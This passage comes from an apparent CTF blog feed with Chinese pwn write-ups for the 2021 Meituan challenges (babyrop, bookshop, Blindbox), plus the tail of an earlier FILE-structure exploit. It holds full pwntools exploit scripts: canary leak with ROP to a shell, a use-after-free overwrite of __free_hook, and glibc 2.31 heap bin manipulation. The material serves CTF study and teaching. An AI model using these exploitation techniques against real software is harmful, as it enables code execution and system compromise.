class="hljs-number">2</span><br>    fake_IO+=p64(<span class="hljs-number">0xffffffff</span>)+p64(<span class="hljs-number">0</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)+p64(io_wfile_jump+<span class="hljs-number">0x10</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout+<span class="hljs-number">0x20</span>)<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">      修改原stdout的vtable字段为 IO_wfile_jumps+0x10</span><br><span class="hljs-string">      使原本应该的 xputsn 项指向 _IO_wfile_seekoff</span><br><span class="hljs-string">      在_IO_wfile_seekoff函数中会调用_IO_switch_to_wget_mode 函数</span><br><span class="hljs-string">      在_IO_switch_to_wget_mode会调用stdout的wide_data字段的vtable字段中overflow项对应的函数，参数为指向stdout的指针</span><br><span class="hljs-string"></span><br><span class="hljs-string">      要注意的是在高版本libc中对 IO结构体的vtable指针进行了检测</span><br><span class="hljs-string">      防止vtable 指向任意位置</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    edit(<span class="hljs-number">10</span>,fake_IO)<br><br>    p.interactive()<br>    <br>p=process(<span class="hljs-string">&#x27;./back&#x27;</span>)<br>pwn(p)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* vtable检测函数 */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021美团高校挑战赛-pwn</title>
    <link href="/page/wp/2021%E7%BE%8E%E5%9B%A2%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B-pwn/"/>
    <url>/page/wp/2021%E7%BE%8E%E5%9B%A2%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="babyrop">babyrop</h2><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-babyrop.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-babyrop-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><code>main函数</code>中<code>v6变量</code>仅占<code>24字节</code>，但却允许输入<code>25</code>个字节，刚好可以泄露<code>cookie</code>的值<br>在<code>main函数</code>伪代码中，输入<code>v5</code>的值处，并不是让<code>v5</code>的值为<code>&quot;password&quot;</code>，而是要<code>v5</code>的值为<code>&quot;password&quot;</code>的地址</p><p><code>vuln函数</code>中存在栈溢出，但溢出数据长度较小， 仅能做到修改<code>rip</code>的值，所以要通过多次栈迁移构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./babyrop&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>bss=e.bss(<span class="hljs-number">0x700</span>)<br>leave=<span class="hljs-number">0x400759</span><br>ret=<span class="hljs-number">0x40075a</span><br>rdi=<span class="hljs-number">0x400913</span><br>rsi_15=<span class="hljs-number">0x400911</span><br>read=<span class="hljs-number">0x40072e</span><br>read_ret=<span class="hljs-number">0x400744</span><br><br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br>p=process(<span class="hljs-string">&#x27;./babyrop&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;name? &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>cookie=u64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+p.read(<span class="hljs-number">7</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(cookie))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4009ae</span>))<br>p.readuntil(<span class="hljs-string">&#x27;message\n&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p64(cookie)+p64(bss)+p64(read)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>payload=p64(bss+<span class="hljs-number">0x100</span>)+p64(rdi)+p64(func_got)+p64(cookie)+p64(bss+<span class="hljs-number">0x18</span>)+p64(read)<br>p.send(payload)<br><br>payload=p64(puts)+p64(read)+p64(read_ret)+p64(cookie)+p64(bss-<span class="hljs-number">0x20</span>)+p64(leave)<br>p.send(payload)<br><br>bss=bss+<span class="hljs-number">0x100</span><br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[func]<br>bin_sh=libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=p64(rdi)+p64(bin_sh)+p64(system)+p64(cookie)+p64(bss-<span class="hljs-number">0x28</span>)+p64(leave)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bookshop">bookshop</h2><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop-1.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><ul><li>程序中仅允许创建<code>24</code>个<code>chunk</code></li><li>每个<code>chunk</code>只有在创建时才能写入</li><li>释放时，没有清空指针，存在<code>UAF</code></li></ul><p>目标是向free_hook中写入system函数地址，要实现这个目标，仅利用<code>tcache bin</code>是不够的，需要同时利用<code>unsorted bin</code>，将多个伪造的<code>chunk</code>放入<code>tcache bin</code>中，然后修改<code>tcache bin</code>链表结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* unsorted bin的判定 */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>在<code>libc2.31</code>中对<code>unsorted bin</code>的检测已经较为完善了，所以我们需要在<code>unsorted bin</code>原先完整的双链表中添加成员，使其看起来正常，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">举个例子：<br>  先在unsorted <span class="hljs-built_in">bin</span>中放入两个chunk(a与b)<br>  然后构造payload设置unsorted <span class="hljs-built_in">bin</span>为 a &lt;=&gt; c &lt;=&gt; d &lt;=&gt; b<br>  这时unsorted <span class="hljs-built_in">bin</span>作为一个双链表成立<br></code></pre></td></tr></table></figure><p>因为只要对应的<code>tcache bin</code>中没有存满，程序就会将<code>chunk</code>放入对应的<code>tcache bin</code>中，而且这里存在<code>uaf</code>，所以我们只要先将<code>chunk_a</code>放入<code>unsorted bin</code>中，然后通过获取<code>chunk</code>使<code>tcache bin</code>为未存满的状态，然后再释放<code>chunk_a</code>，这样<code>chunk_a</code>就会同时存在于<code>tcache bin</code>与<code>unsorted bin</code>中，当下次获取<code>chunk</code>时，就会优先从<code>tcache bin</code>中获取，在这时修改<code>chunk_a</code>的值，就可以修改<code>unsorted bin</code>的结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data=<span class="hljs-string">&#x27; &#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Book\n&gt; &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;bag?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;./bookshop&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br><br>add() <span class="hljs-comment">#0</span><br>add() <span class="hljs-comment">#1</span><br>add() <span class="hljs-comment">#2</span><br>add() <span class="hljs-comment">#3</span><br>add() <span class="hljs-comment">#4</span><br>add() <span class="hljs-comment">#5</span><br>add() <span class="hljs-comment">#6</span><br>add() <span class="hljs-comment">#7</span><br>payload=p64(<span class="hljs-number">0xa0</span>)*<span class="hljs-number">0x13</span><br>add(payload) <span class="hljs-comment">#8</span><br>add(payload) <span class="hljs-comment">#9</span><br>add(payload) <span class="hljs-comment">#10</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>heap_0=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10</span><br>heap_7=heap_0+<span class="hljs-number">0xa0</span>*<span class="hljs-number">7</span><br>heap_7_1=heap_7+<span class="hljs-number">0x30</span><br>heap_7_2=heap_7_1+<span class="hljs-number">0x20</span><br>heap_9=heap_0+<span class="hljs-number">0xa0</span>*<span class="hljs-number">9</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br><br>free(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">9</span>)<br><br>add() <span class="hljs-comment">#11,6</span><br><br>free(<span class="hljs-number">9</span>)<br>payload=p64(heap_7_1)+p64(d)<br>add(payload) <span class="hljs-comment">#12</span><br><br>free(<span class="hljs-number">7</span>)<br><br>payload=p64(d)+p64(heap_7_2)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+\<br>        p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(heap_7_2)+p64(heap_9)+\<br>        p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(heap_7)+p64(heap_7_1)<br><br>add(payload) <span class="hljs-comment">#13,7</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add()<br><span class="hljs-comment"># -19</span><br><br>add() <span class="hljs-comment">#20</span><br><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(free_hook)<br><br>add(payload) <span class="hljs-comment">#21</span><br>add(<span class="hljs-string">&quot;/bin/bash&quot;</span>) <span class="hljs-comment">#22</span><br>add(p64(system)) <span class="hljs-comment">#23</span><br>free(<span class="hljs-number">22</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Blindbox">Blindbox</h2><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-4.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-1.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-2.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-3.jpg" srcset="/img/loading.gif" lazyload alt="pay函数代码" title="pay函数代码"></p><ul><li>总结出来整个程序就是只能创建三种<code>chunk</code>，三种<code>chunk</code>的<code>size</code>由用户指定，但<code>size</code>必须在<code>0x88~0x233</code>之间</li><li>程序在释放<code>chunk</code>时，没有清空指针，所以存在<code>UAF</code></li><li>整个程序只能修改两次<code>chunk</code>的数据，其中一次只能修改前<code>0x10</code>的数据，也就是<code>fd,bk字段</code>的数据，另一次会创建一个<code>0xa0</code>的<code>chunk</code>，并且写入<code>0x90</code>个字节的数据</li><li>程序只能输出<code>chunk</code>的<code>fd字段</code>的数据<br>当获取到<code>system函数</code>的地址之后，可以利用<code>pay函数</code>获取<code>shell</code></li></ul><p>因为程序只能通过创建一个<code>0xa0</code>大小的<code>chunk</code>，而向某个地址中写入<code>0x90</code>个字节的数据，所以我们需要做的就是将<code>0xa0大小的tcache bin</code>的第一个成员设置为我们要修改的地址，而直接释放<code>chunk</code>，并修改其<code>fd,bk字段</code>，是达不到要求的。所以我们只能先将<code>chunk</code>放入<code>small bin</code>中，然后创建对应大小的<code>chunk</code>，这时程序会将对应的<code>small bin</code>中剩下的<code>chunk</code>逆序存满<code>tcache bin</code>，只要我们修改了<code>small bin</code>中后面的某一个<code>chunk</code>的<code>bk字段</code>，就可以达到我们想要的效果</p><p>在<code>libc 2.31</code>中，通过<code>small bin</code>获取<code>chunk</code>时，只会检测第一个成员，与第二个成员之间的双链表结构是否成立，然后就会将第一个成员返回给用户，让剩余的成员填满<code>tcache bin</code>，在将<code>small bin中的chunk</code>放入<code>tcache bin</code>时，会设置下一个成员的<code>fd段</code>为对应的<code>small bin</code>的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/* small bin获取chunk代码 */</span><br><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>&#123; <span class="hljs-comment">// 当用户申请的chunk的大小符合small bin时</span><br>  <span class="hljs-comment">// 就尝试使用small bin进行分配</span><br>  <br>  idx = smallbin_index (nb);<br>  bin = bin_at (av, idx);<br>  <span class="hljs-comment">// 获取对应bin</span><br>  <br>  <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>    &#123; <span class="hljs-comment">// 当 bin中存在chunk时，执行下面的指令</span><br>     <br>      bck = victim-&gt;bk;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>    <span class="hljs-comment">// 当small bin中的chunk的数据被非法修改了，就进行报错</span><br>    <span class="hljs-comment">// 虽然检测了small bin是否完整，但仅检测最后一个节点</span><br>    <span class="hljs-comment">// 所以只要修改不存在于最后一个节点就可以将伪造的chunk放入tcache bin中</span><br>    <span class="hljs-comment">// 因为small bin中的chunk的大小都相同，</span><br>    <span class="hljs-comment">// 所以再放入tcache bin中时，不会检测大小，</span><br>    <span class="hljs-comment">// 这就导致可以将任意地址放入任意tcache bin中</span><br>    <br>      set_inuse_bit_at_offset (victim, nb);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br>    <span class="hljs-comment">// 将small bin中的第一个chunk 从双链表中删除</span><br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    set_non_main_arena (victim);<br>      check_malloced_chunk (av, victim, nb);<br>    <span class="hljs-comment">// 设置chunk的头部，并检测chunk是否合法</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123; <span class="hljs-comment">// 当tcache bins中对应的bin没有存满时</span><br>      <span class="hljs-comment">// 将 small bin中剩余的chunk放入tcache bin中</span><br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>         &amp;&amp; (tc_victim = last (bin)) != bin)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          bck = tc_victim-&gt;bk;<br>          set_inuse_bit_at_offset (tc_victim, nb);<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>        set_non_main_arena (tc_victim);<br>          bin-&gt;bk = bck;<br>          bck-&gt;fd = bin;<br>            <span class="hljs-comment">// 设置chunk的 头部，并将其从 bin中删除</span><br>          tcache_put (tc_victim, tc_idx);<br>            &#125;<br>    &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>      <span class="hljs-comment">// 将chunk的数据段初始化之后</span><br>      <span class="hljs-comment">// 作为用户的chunk返回</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以下面的难点就在于<strong>如何修改smallbin</strong>,通过上面的描述我们知道，使用正常的释放操作，无法在<code>tcache bin</code>未存满的状态下存在<code>chunk</code>，那么方法只有一个，那就是通过分裂一个较大的<code>chunk</code>,来构造一个<code>0xa0</code>的<code>chunk</code>，使其存在于<code>unsorted bin</code>中，然后再创建一个较大的chunk，这时就会将<code>unsorted bin</code>中的<code>chunk</code>放入对应的<code>small bin</code>中,因为这里<code>0xa0</code>的<code>chunk</code>是由分裂产生的，并不是通过释放获取的，所以正常来说我们是没有这个<code>0xa0</code>大小的<code>chunk</code>的地址，无法修改其数据</p><p>这里我们以<code>0xa0 0xc0 0x160</code>大小的chunk举例<br>首先需要将<code>0xc0 0x160</code>大小对应的<code>tcache bin</code>填满，然后创建两个<code>0xc0</code>的<code>chunk_a</code>与<code>chunk_b</code><br>将这两个<code>chunk</code>释放掉，这时<code>chunk_a</code>与<code>chunk_b</code>都会与<code>top chunk</code>合并，然后创建一个<code>0x160</code>的<code>chunk(chunk_a)</code>，这里需要再次创建一个<code>chunk(chunk_t)</code>，这是为了防止<code>chunk a</code>与<code>top chunk</code>合并,释放 <code>chunk_a</code>，这时在<code>unsorted bin</code>中存在一个<code>0x160</code>大小的<code>chunk_a</code>，这时在创建一个<code>0xc0</code>大小的<code>chunk(chunk_a)</code>，地址也与<code>a</code>相同，并且分裂出一个<code>0xa0</code>大小的<code>chunk(chunk_b)</code>放在<code>unsorted bin</code>中，因为<code>chunk_a</code>与<code>chunk_b</code>之间地址相差<code>0xc0</code>，所以这个<code>0xa0</code>大小的<code>chunk</code>其实就是<code>chunk_b</code>，只要再创建一个较大的<code>chunk_t1</code>，就可以将<code>chunk_b</code>放入<code>small bin</code>中，只要我们没有覆盖原先指向<code>chunk_b</code>的指针，我们就可以更改<code>small bin</code>的结构，只要再重复几次前面的操作，就可以绕过<code>small bin</code>的检测，使我们构造的<code>chunk</code>进入<code>tcache bin</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 